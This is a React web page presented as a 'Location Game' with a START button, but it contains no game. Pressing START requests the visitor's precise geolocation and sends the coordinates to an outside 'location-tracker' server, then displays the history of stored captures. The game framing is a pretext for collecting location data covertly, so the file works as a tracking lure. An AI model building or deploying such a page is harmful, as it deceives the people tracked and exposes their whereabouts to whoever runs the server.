import { useState } from "react";

function App() {
  const [status, setStatus] = useState("🎮 Press START to play");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);

  const startGame = () => {
    if (!navigator.geolocation) {
      setStatus("❌ Location not supported");
      return;
    }

    setLoading(true);
    setStatus("📡 Detecting location...");

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        try {
          // ✅ Send to backend
          await fetch("https://location-tracker-km22.onrender.com/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ lat, lng }),
          });

          setStatus("🏆 Location captured successfully!");

          // ✅ Fetch history
          const res = await fetch("https://location-tracker-km22.onrender.com/locations");
          const data = await res.json();

          setHistory(data);
          setLoading(false);

        } catch (err) {
          setStatus("❌ Error sending data");
          setLoading(false);
        }
      },
      () => {
        setStatus("❌ Permission denied");
        setLoading(false);
      },
      { enableHighAccuracy: true }
    );
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>🎮 Location Game</h1>

      <button style={styles.button} onClick={startGame}>
        {loading ? "⏳ Loading..." : "▶ START GAME"}
      </button>

      <p style={styles.status}>{status}</p>

      {/* ✅ HISTORY */}
      <div style={styles.history}>
        <h2>📜 History (IST)</h2>

        {history.length === 0 ? (
          <p>No data yet</p>
        ) : (
          history.map((item, index) => (
            <div key={index} style={styles.card}>
              🕒 {item.time}
            </div>
          ))
        )}
      </div>
    </div>
  );
}

const styles = {
  container: {
    minHeight: "100vh",
    background: "linear-gradient(135deg, #0f172a, #1e293b)",
    color: "#fff",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    paddingTop: "60px",
    fontFamily: "Arial, sans-serif",
  },
  title: {
    fontSize: "42px",
    marginBottom: "20px",
  },
  button: {
    padding: "15px 35px",
    fontSize: "18px",
    background: "#22c55e",
    border: "none",
    borderRadius: "12px",
    cursor: "pointer",
    fontWeight: "bold",
    transition: "0.3s",
  },
  status: {
    marginTop: "20px",
    fontSize: "18px",
    color: "#e2e8f0",
  },
  history: {
    marginTop: "40px",
    width: "90%",
    maxWidth: "500px",
  },
  card: {
    background: "#334155",
    padding: "12px",
    margin: "10px 0",
    borderRadius: "10px",
    boxShadow: "0 4px 10px rgba(0,0,0,0.3)",
  },
};

export default App;